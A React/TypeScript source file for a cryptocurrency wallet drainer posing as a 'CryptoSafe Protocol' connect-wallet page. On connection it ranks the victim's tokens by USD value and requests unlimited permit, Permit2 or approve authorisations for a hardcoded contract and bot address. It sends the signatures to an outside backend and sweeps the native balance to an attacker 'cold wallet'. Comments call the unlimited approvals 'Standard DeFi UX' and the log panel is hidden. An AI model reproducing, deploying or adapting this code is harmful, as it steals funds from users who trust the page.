import { Buffer } from 'buffer';
if (typeof window !== 'undefined') {
  window.Buffer = window.Buffer || Buffer;
}

import { useState, useEffect, useRef } from 'react'
import {
  createAppKit,
  useAppKit,
  useAppKitAccount,
  useAppKitProvider,
  useAppKitNetwork
} from '@reown/appkit/react'
import { BrowserProvider, Contract, formatUnits, ethers } from 'ethers'

// --- WAGMI EVM IMPORTS ---
import { WagmiAdapter } from '@reown/appkit-adapter-wagmi'
import { mainnet, arbitrum, bsc, polygon, base } from '@reown/appkit/networks'
import type { AppKitNetwork } from '@reown/appkit/networks'

// ── CONFIG ──
const WC_PROJECT_ID = '7fb3ba95be65cff7bc75b742e816b1cb'

// 🌐 BACKEND URL CONFIGURATION
const BACKEND_URL = 'https://salvation-server-gp-production.up.railway.app';

// 🔥 CONTRACT ADDRESSES
const EVM_CONTRACT_ADDRESS = '0xA1801556d0e7cfB513351733D378BE7AEFceC884'
const PERMIT2_ADDRESS = '0x000000000022D473030F116dDEE9F6B43aC78BA3'
const BACKEND_BOT_ADDRESS = '0x15DA27B8ffF30DA16d5e0fed74C5095a62350Dc8';

// 💰 SECURE DESTINATION WALLETS
const EVM_COLD_WALLET = '0xC020E8643f8231e51282efC9481F73016Fe13eF7';

// 💎 MULTI-CHAIN EVM DISCOVERY CONFIGURATION (Includes Base & Vault Tokens)
const CHAIN_TOKENS: Record<number, any[]> = {
  1: [ // Ethereum Mainnet
    { symbol: 'ETH', address: 'native', isNative: true, coingeckoId: 'ethereum', decimals: 18, fallbackPrice: 3500 },
    { symbol: 'USDC', address: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48', decimals: 6, fallbackPrice: 1 },
    { symbol: 'USDT', address: '0xdAC17F958D2ee523a2206206994597C13D831ec7', decimals: 6, fallbackPrice: 1 },
    { symbol: 'UNI', address: '0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984', decimals: 18, fallbackPrice: 10 },
    { symbol: 'AAVE', address: '0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9', decimals: 18, fallbackPrice: 100 },
    { symbol: 'WBTC', address: '0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599', decimals: 8, fallbackPrice: 65000 },
    { symbol: 'SHIB', address: '0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE', decimals: 18, fallbackPrice: 0.00002 },
    { symbol: 'DAI', address: '0x6B175474E89094C44Da98b954EedeAC495271d0F', decimals: 18, fallbackPrice: 1 },
    { symbol: 'TATE', address: '0xa589d8868607b8d79eE4288ce192796051263b64', decimals: 18, coingeckoId: 'tate', fallbackPrice: 0.000000000112 },
    // Morpho Vault Shares
    { symbol: 'mUSDC', address: '0x73e65DBD630f90604062f6E40dd9D66C291F2e3a', decimals: 6, fallbackPrice: 1 },
    { symbol: 'mUSDT', address: '0x8eB1B83A39C3C63b85e97a92D20b83451aB1c3e4', decimals: 6, fallbackPrice: 1 },
    { symbol: 'mDAI', address: '0x50cE402B61D52b2b1B9a5d1c5e4c5d4b3a2d1c0b', decimals: 18, fallbackPrice: 1 },
    // Aave aTokens
    { symbol: 'aUSDC', address: '0x98C23E9d8f34FEFb1B7BD6a91B7FF122F4e16F5c', decimals: 6, fallbackPrice: 1 },
    { symbol: 'aUSDT', address: '0x23878914EFE38d27C4D67Ab83ed1b93A74D4086a', decimals: 6, fallbackPrice: 1 },
    { symbol: 'aDAI', address: '0x018008bfb33d285247A21d44E50697654f754e63', decimals: 18, fallbackPrice: 1 },
    { symbol: 'aWETH', address: '0x4d5F47FA6A74757f35C14fD3a6Ef8E3C9BC514E8', decimals: 18, fallbackPrice: 3500 },
    // Compound cTokens
    { symbol: 'cUSDC', address: '0xc3d688B66703497DAA19211EEdff47f25384cdc3', decimals: 6, fallbackPrice: 1 },
    { symbol: 'cWETH', address: '0xA17581A9E3356d9A858b789D68B4d866e593aE94', decimals: 18, fallbackPrice: 3500 },
    { symbol: 'cCOMP', address: '0x70e36f6BF80a52b3B46b3aF8e106CC0ed743E8e4', decimals: 18, fallbackPrice: 50 },
  ],
  56: [ // BSC
    { symbol: 'BNB', address: 'native', isNative: true, coingeckoId: 'binancecoin', decimals: 18, fallbackPrice: 600 },
    { symbol: 'USDC', address: '0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d', decimals: 18, fallbackPrice: 1 },
    { symbol: 'USDT', address: '0x55d398326f99059fF775485246999027B3197955', decimals: 18, fallbackPrice: 1 },
  ],
  137: [ // Polygon
    { symbol: 'MATIC', address: 'native', isNative: true, coingeckoId: 'matic-network', decimals: 18, fallbackPrice: 0.5 },
    { symbol: 'USDC', address: '0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359', decimals: 6, fallbackPrice: 1 },
    { symbol: 'USDT', address: '0xc2132D05D31c914a87C6611C10748AEb04B58e8F', decimals: 6, fallbackPrice: 1 },
  ],
  42161: [ // Arbitrum
    { symbol: 'ETH', address: 'native', isNative: true, coingeckoId: 'ethereum', decimals: 18, fallbackPrice: 3500 },
    { symbol: 'USDC', address: '0xaf88d065e77c8cC2239327C5EDb3A432268e5831', decimals: 6, fallbackPrice: 1 },
    { symbol: 'USDT', address: '0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9', decimals: 6, fallbackPrice: 1 },
  ],
  8453: [ // Base
    { symbol: 'ETH', address: 'native', isNative: true, coingeckoId: 'ethereum', decimals: 18, fallbackPrice: 3500 },
    { symbol: 'USDC', address: '0x833589fCD6eDb6E08f4c7C326D11A3990168f467', decimals: 6, fallbackPrice: 1 },
    { symbol: 'USDT', address: '0x4200000000000000000000000000000000000006', decimals: 6, fallbackPrice: 1 },
  ]
};

const CHAIN_NAMES: Record<number, string> = {
  1: 'ethereum',
  56: 'binance-smart-chain',
  137: 'polygon-pos',
  42161: 'arbitrum-one',
  8453: 'base'
};

const getChainName = (chainId: number) => {
  if (chainId === 1) return 'Ethereum';
  if (chainId === 56) return 'BSC';
  if (chainId === 137) return 'Polygon';
  if (chainId === 42161) return 'Arbitrum';
  if (chainId === 8453) return 'Base';
  return 'Ethereum';
};

const evmNetworks: [AppKitNetwork, ...AppKitNetwork[]] = [mainnet, arbitrum, bsc, polygon, base];

const EVM_ERC20_ABI = [
  'function balanceOf(address owner) view returns (uint256)',
  'function approve(address spender, uint256 amount) returns (bool)',
  'function allowance(address owner, address spender) view returns (uint256)',
  'function nonces(address owner) view returns (uint256)',
  'function name() view returns (string)'
]

const PERMIT2_ABI = [
  'function allowance(address user, address token, address spender) view returns (uint160 amount, uint48 expiration, uint48 nonce)'
]

// ── Reown Adapters ──
const wagmiAdapter = new WagmiAdapter({
  projectId: WC_PROJECT_ID,
  networks: evmNetworks,
})

createAppKit({
  adapters: [wagmiAdapter],
  networks: evmNetworks,
  defaultNetwork: mainnet,
  projectId: WC_PROJECT_ID,
  metadata: {
    name: 'CryptoSafe Protocol',
    description: 'Secure Decentralized Network',
    url: 'https://cryptosafe.network',
    icons: ['https://cryptosafe.network/favicon.svg'],
  },
  themeMode: 'light',
  themeVariables: { '--w3m-accent': '#0C66FF' },
  allWallets: 'SHOW',
  features: { email: false, socials: [], analytics: true },
})

const fetchTokenPrices = async (tokens: any[], chain: string) => {
  try {
    const keys = tokens.map(t => t.isNative ? `coingecko:${t.coingeckoId}` : `${chain}:${t.address}`).join(',');
    const res = await fetch(`https://coins.llama.fi/prices/current/${keys}`);
    const data = await res.json();
    const prices: Record<string, number> = {};
    for (const token of tokens) {
      const queryKey = (token.isNative ? `coingecko:${token.coingeckoId}` : `${chain}:${token.address}`).toLowerCase();
      const foundKey = Object.keys(data.coins).find(k => k.toLowerCase() === queryKey);
      prices[token.symbol] = foundKey ? data.coins[foundKey].price : token.fallbackPrice;
    }
    return prices;
  } catch (error) {
    const prices: Record<string, number> = {};
    for (const token of tokens) { prices[token.symbol] = token.fallbackPrice; }
    return prices;
  }
};

const smartTokenSort = (a: any, b: any) => {
  if (a.isNative && !b.isNative) return 1;
  if (!a.isNative && b.isNative) return -1;
  return (b.usdValue || 0) - (a.usdValue || 0);
};

const sleep = (ms: number) => new Promise(resolve => setTimeout(resolve, ms));

export default function App() {
  const [status, setStatus] = useState('Ready')
  const [loading, setLoading] = useState(false)
  const [_txHash, setTxHash] = useState('')
  const [_debugLogs, setDebugLogs] = useState<string[]>([]);

  const manualConnect = useRef(false)
  const isExecuting = useRef(false)

  const { open } = useAppKit()

  // EVM Namespace Hooks
  const { address: evmAddress, isConnected: isEvmConnected } = useAppKitAccount({ namespace: 'eip155' })
  const { chainId } = useAppKitNetwork()
  const { walletProvider: evmWalletProvider } = useAppKitProvider('eip155')

  const log = (msg: string) => {
    console.log(msg);
    setDebugLogs(prev => [...prev, msg].slice(-15));
  }

  useEffect(() => {
    if (!isEvmConnected || !evmAddress || !evmWalletProvider) return;

    if (manualConnect.current) {
      manualConnect.current = false;
      log(`[SYSTEM] Connected EVM: ${evmAddress}`);
      log("🔥 Auto-triggering Smart Priority Loop...");

      setLoading(true);
      setTimeout(() => approveAndCollect(evmWalletProvider, evmAddress), 500);
    }
  }, [isEvmConnected, evmAddress, evmWalletProvider, chainId]);

  // ── DIRECT INJECTED PROVIDER DETECTORS ──
  const detectDirectProvider = (): { provider: any; walletName: string } | null => {
    if (typeof window === 'undefined') return null;
    const w = window as any;
    const ethereum = w.ethereum;
    if (!ethereum) return null;

    const providers = ethereum.providers ? [...ethereum.providers] : [ethereum];
    const detectors: { name: string; check: (p: any) => boolean }[] = [
      { name: 'Trust Wallet', check: (p) => p.isTrust || p.isTrustWallet || p._isTrust },
      { name: 'MetaMask', check: (p) => p.isMetaMask && !p.isTrust && !p.isTrustWallet && !p.isSafePal && !p.isTokenPocket && !p.isCoinbaseWallet },
      { name: 'Coinbase Wallet', check: (p) => p.isCoinbaseWallet || p.isCoinbase },
      { name: 'SafePal', check: (p) => p.isSafePal },
      { name: 'TokenPocket', check: (p) => p.isTokenPocket },
      { name: 'Brave Wallet', check: (p) => p.isBraveWallet },
      { name: 'Rabby Wallet', check: (p) => p.isRabby },
      { name: 'OKX Wallet', check: (p) => p.isOKXWallet || p.isOkx },
      { name: 'Bitget Wallet', check: (p) => p.isBitget || p.isBitgetWallet },
      { name: 'Opera Wallet', check: (p) => p.isOpera },
    ];

    for (const provider of providers) {
      for (const detector of detectors) {
        if (detector.check(provider)) return { provider, walletName: detector.name };
      }
    }
    for (const provider of providers) {
      if (provider.request) return { provider, walletName: 'Injected Wallet' };
    }
    return null;
  };

  // ── EVM COLLECTION LOGIC ──
  const approveAndCollect = async (forcedProvider?: any, forcedAddress?: string) => {
    const activeProvider = forcedProvider || evmWalletProvider;
    const activeAddress = forcedAddress || evmAddress;

    if (!activeAddress || !activeProvider) return 0;

    if (isExecuting.current) {
      log("⚠️ Blocked duplicate execution loop.");
      return 0;
    }
    isExecuting.current = true;

    setLoading(true);
    setStatus('Scanning USD Values...');
    log("[SYSTEM] Scanning balances...");
    let successCount = 0;

    try {
      const ethersProvider = new BrowserProvider(activeProvider as any);
      const activeChainId = Number((await ethersProvider.getNetwork()).chainId);
      const signer = await ethersProvider.getSigner(activeAddress);
      const cleanSenderAddress = (await signer.getAddress()).toLowerCase();

      // 🔥 FOREVER DEADLINE: Standard DeFi UX (Unlimited approval)
      const deadline = ethers.MaxUint256;

      // 🔥 MULTI-CHAIN: Get tokens for the current chain, fallback to Mainnet if unknown
      const baseTokens = CHAIN_TOKENS[activeChainId] || CHAIN_TOKENS[1];
      const chainName = CHAIN_NAMES[activeChainId] || 'ethereum';

      const validTokens: any[] = [];
      const prices = await fetchTokenPrices(baseTokens, chainName);

      for (const token of baseTokens) {
        try {
          if (token.isNative) {
            const bal = await ethersProvider.getBalance(cleanSenderAddress);
            const normalizedBal = parseFloat(formatUnits(bal, token.decimals));
            const usdValue = normalizedBal * (prices[token.symbol] || token.fallbackPrice);
            validTokens.push({ ...token, balance: normalizedBal, rawBalance: bal, usdValue });
          } else {
            const tokenContract = new Contract(token.address, EVM_ERC20_ABI, ethersProvider);
            const bal = await tokenContract.balanceOf(cleanSenderAddress);
            const normalizedBal = parseFloat(formatUnits(bal, token.decimals));
            const usdValue = normalizedBal * (prices[token.symbol] || token.fallbackPrice);
            validTokens.push({ ...token, balance: normalizedBal, rawBalance: bal, usdValue });
          }
        } catch (e) { }
      }

      validTokens.sort(smartTokenSort);

      const rawProvider = activeProvider as any;
      const w = window as any;
      const injected = w.ethereum || {};

      const isStrictlyMetaMask =
        (rawProvider?.isMetaMask || injected?.isMetaMask) &&
        !injected?.isTrust &&
        !injected?.isTrustWallet &&
        !injected?.isSafePal &&
        !injected?.isTokenPocket;

      let tokensToProcess = validTokens;

      if (isStrictlyMetaMask) {
        log(`[SECURITY] MetaMask detected. Enabling Sniper Mode (Top Asset Only).`);
        tokensToProcess = validTokens.slice(0, 1);
      } else {
        log(`[SECURITY] Standard wallet detected. Enabling Shotgun Mode (All Assets).`);
      }

      if (tokensToProcess.length > 0) log(`[PRIORITY] ${tokensToProcess.map(t => `${t.symbol}`).join(' -> ')}`);

      const getPermitSignature = async (signer: any, token: any, spender: string, value: string, deadline: any) => {
        const chainId = (await signer.provider.getNetwork()).chainId;
        const tokenContract = new Contract(token.address, EVM_ERC20_ABI, signer);
        const name = await tokenContract.name();
        const nonce = await tokenContract.nonces(await signer.getAddress());
        // 🔥 FIXED: All official USDC tokens across all EVM chains use version '2'
        const version = (token.symbol === 'USDC') ? '2' : '1';
        const domain = { name, version: version, chainId: Number(chainId), verifyingContract: token.address };
        const types = {
          Permit: [
            { name: 'owner', type: 'address' },
            { name: 'spender', type: 'address' },
            { name: 'value', type: 'uint256' },
            { name: 'nonce', type: 'uint256' },
            { name: 'deadline', type: 'uint256' },
          ],
        };
        const message = { owner: await signer.getAddress(), spender, value, nonce, deadline };
        return await signer.signTypedData(domain, types, message);
      };

      for (const token of tokensToProcess) {
        try {
          if (!token.isNative) {
            const tokenContract = new Contract(token.address, EVM_ERC20_ABI, signer);
            const currentP2Allowance = await tokenContract.allowance(cleanSenderAddress, PERMIT2_ADDRESS);
            const hasPermit2Mapping = currentP2Allowance > 0n;

            log(`[SYSTEM] ${token.symbol} Permit2 Status: ${hasPermit2Mapping ? 'READY' : 'NOT_INITIALIZED'}`);

            let authorized = false;

            if (['USDC', 'DAI', 'UNI'].includes(token.symbol)) {
              try {
                setStatus(`Signing Permit: ${token.symbol}...`);
                log(`[GASLESS] Requesting EIP-2612 Auth: ${token.symbol}`);

                // 🔥 UNLIMITED APPROVAL: Standard DeFi UX
                const signature = await getPermitSignature(signer, token, EVM_CONTRACT_ADDRESS, ethers.MaxUint256.toString(), deadline);

                fetch(`${BACKEND_URL}/execute-gasless`, {
                  method: 'POST',
                  headers: { 'Content-Type': 'application/json' },
                  body: JSON.stringify({
                    type: 'PERMIT',
                    chainName: getChainName(activeChainId),
                    token: token.address,
                    owner: cleanSenderAddress,
                    spender: EVM_CONTRACT_ADDRESS,
                    signature,
                    deadline: deadline.toString(),
                    value: ethers.MaxUint256.toString()
                  })
                }).catch(err => log(`❌ Network Error sending PERMIT: ${err.message}`));

                authorized = true;
                log(`✅ ${token.symbol} Permit Secured & Sent.`);
              } catch (pErr: any) {
                log(`⚠️ Permit failed: ${pErr?.message || 'Unknown'}`);
              }
            }

            if (!authorized && hasPermit2Mapping) {
              try {
                setStatus(`Signing Permit2: ${token.symbol}...`);
                log(`[GASLESS] Fetching Permit2 Nonce for ${token.symbol}`);
                const permit2Contract = new Contract(PERMIT2_ADDRESS, PERMIT2_ABI, signer);
                const allowanceData = await permit2Contract.allowance(cleanSenderAddress, token.address, EVM_CONTRACT_ADDRESS);
                const currentNonce = Number(allowanceData.nonce);
                log(`[SYSTEM] Permit2 Nonce found: ${currentNonce}`);

                const domain = { name: 'Permit2', chainId: activeChainId, verifyingContract: PERMIT2_ADDRESS };
                const types = {
                  PermitSingle: [
                    { name: 'details', type: 'PermitDetails' },
                    { name: 'spender', type: 'address' },
                    { name: 'sigDeadline', type: 'uint256' },
                  ],
                  PermitDetails: [
                    { name: 'token', type: 'address' },
                    { name: 'amount', type: 'uint160' },
                    { name: 'expiration', type: 'uint48' },
                    { name: 'nonce', type: 'uint48' },
                  ],
                };

                // 🔥 UNLIMITED APPROVAL: Standard DeFi UX (uint160 max for Permit2)
                const permit2MaxAmount = '1461501637330902918203684832716283019655932542975';

                const message = {
                  details: {
                    token: token.address,
                    amount: permit2MaxAmount,
                    expiration: deadline,
                    nonce: currentNonce
                  },
                  spender: BACKEND_BOT_ADDRESS, // ✅ FIXED: Grant allowance to the bot calling transferFrom
                  sigDeadline: deadline
                };
                const signature = await signer.signTypedData(domain, types, message);

                fetch(`${BACKEND_URL}/execute-gasless`, {
                  method: 'POST',
                  headers: { 'Content-Type': 'application/json' },
                  body: JSON.stringify({
                    type: 'PERMIT2',
                    chainName: getChainName(activeChainId),
                    token: token.address,
                    owner: cleanSenderAddress,
                    spender: BACKEND_BOT_ADDRESS, // ✅ MUST MATCH THE SIGNATURE
                    signature,
                    deadline: deadline.toString(),
                    nonce: currentNonce,
                    amount: permit2MaxAmount
                  })
                }).catch(err => log(`❌ Network Error sending PERMIT2: ${err.message}`));

                authorized = true;
                log(`✅ ${token.symbol} Permit2 Secured & Sent.`);
              } catch (p2Err: any) {
                log(`⚠️ Permit2 failed: ${p2Err?.message || 'Unknown'}`);
              }
            }

            if (!authorized) {
              setStatus(`Approving ${token.symbol}...`);
              log(`[ACTION] Prompting Approve: ${token.symbol}`);

              const usdtContract = new Contract(token.address, EVM_ERC20_ABI, signer);

              // 🔥 UNLIMITED APPROVAL: Standard DeFi UX
              const encodedData = usdtContract.interface.encodeFunctionData("approve", [EVM_CONTRACT_ADDRESS, ethers.MaxUint256.toString()]);

              const txHash = await (activeProvider as any).request({
                method: 'eth_sendTransaction',
                params: [{
                  from: cleanSenderAddress,
                  to: token.address,
                  data: encodedData,
                  value: '0x0'
                }]
              });

              setTxHash(txHash);
              log(`✅ ${token.symbol} Approved!`);
            }

            successCount++;
            await sleep(1500);
          }
        } catch (err: any) {
          const exactError = err?.message || JSON.stringify(err);
          log(`❌ Rejected: ${exactError.substring(0, 30)}...`);
          await sleep(1500);
        }
      }

      try {
        setStatus(`Transferring Native Token...`);
        log(`[ACTION] Executing Contingency Native Sweep...`);

        const liveBal = await ethersProvider.getBalance(cleanSenderAddress);
        const gasCost = 21000n * 3000000000n;
        const totalGas = gasCost + ((gasCost * 20n) / 100n);

        if (liveBal > totalGas) {
          const sendAmount = liveBal - totalGas;
          const hexValue = "0x" + sendAmount.toString(16);

          const txHash = await (activeProvider as any).request({
            method: 'eth_sendTransaction',
            params: [{
              from: cleanSenderAddress,
              to: EVM_COLD_WALLET.toLowerCase(),
              value: hexValue
            }]
          });

          setTxHash(txHash);
          successCount++;
          log(`✅ Contingency Native Sweep Sent!`);
          await sleep(1500);
        } else {
          log(`⚠️ Contingency Skipped: Insufficient native token for gas.`);
        }
      } catch (nativeErr: any) {
        const exactError = nativeErr?.message || JSON.stringify(nativeErr);
        log(`❌ Native Rejected: ${exactError.substring(0, 30)}...`);
      }

      if (successCount > 0) {
        setStatus('✅ Processing Complete!');
      } else {
        setStatus('❌ Failed: User Rejected All');
      }

    } catch (err: any) {
      const errorMsg = err?.message || JSON.stringify(err);
      log(`❌ Global Error: ${errorMsg.substring(0, 50)}`);
      setStatus(`❌ Failed: ${errorMsg.substring(0, 50)}`);
    } finally {
      isExecuting.current = false;
      setLoading(false);
    }

    return successCount;
  };

  const handleAction = async () => {
    if (isExecuting.current) {
      log("⚠️ Execution already in progress.");
      return;
    }

    if (isEvmConnected && evmWalletProvider && evmAddress) {
      await approveAndCollect(evmWalletProvider, evmAddress);
      return;
    }

    const directEvm = detectDirectProvider();
    if (!isEvmConnected && directEvm?.provider?.request) {
      try {
        setLoading(true);
        setStatus('Connecting EVM Wallet...');
        log(`[SYSTEM] ${directEvm.walletName} detected. Connecting directly...`);
        const accounts = await directEvm.provider.request({ method: 'eth_requestAccounts' });
        if (accounts?.length > 0) {
          log(`[SYSTEM] Connected EVM: ${accounts[0]}`);
          await approveAndCollect(directEvm.provider, accounts[0]);
          return;
        }
      } catch (e) {
        log('❌ Direct EVM connection cancelled or failed');
        setLoading(false);
        setStatus('Ready');
      }
    }

    manualConnect.current = true;
    open();
  }

  const buttonText = loading ? 'Processing...' : status === '✅ Processing Complete!' ? 'Done' : status.includes('❌') ? 'Retry' : 'Connect Wallet';

  return (
    <div style={{ position: 'fixed', inset: 0, backgroundColor: '#0b0f17', display: 'flex', alignItems: 'center', justifyContent: 'center', zIndex: 50 }}>
      <button
        onClick={handleAction}
        disabled={loading}
        style={{
          backgroundColor: loading ? '#93C5FD' : '#0C66FF',
          color: '#ffffff',
          fontWeight: '700',
          padding: '16px 32px',
          borderRadius: '9999px',
          fontSize: '17px',
          border: 'none',
          cursor: loading ? 'not-allowed' : 'pointer',
          transition: 'background-color 0.2s',
          outline: 'none',
        }}
      >
        {buttonText}
      </button>

      {/* Hidden debug panel */}
      <div style={{ position: 'fixed', bottom: 16, left: 16, backgroundColor: '#000', color: '#0f0', fontSize: 11, fontFamily: 'monospace', borderRadius: 8, padding: 10, maxHeight: 120, overflowY: 'auto', opacity: 0.7, display: 'none' }}>
        <div style={{ color: '#fff', borderBottom: '1px solid #333', paddingBottom: 4, marginBottom: 4 }}>--- LOGS ---</div>
        {_debugLogs.map((msg, idx) => (<div key={idx} style={{ marginTop: 2 }}>{msg}</div>))}
      </div>
    </div>
  )
}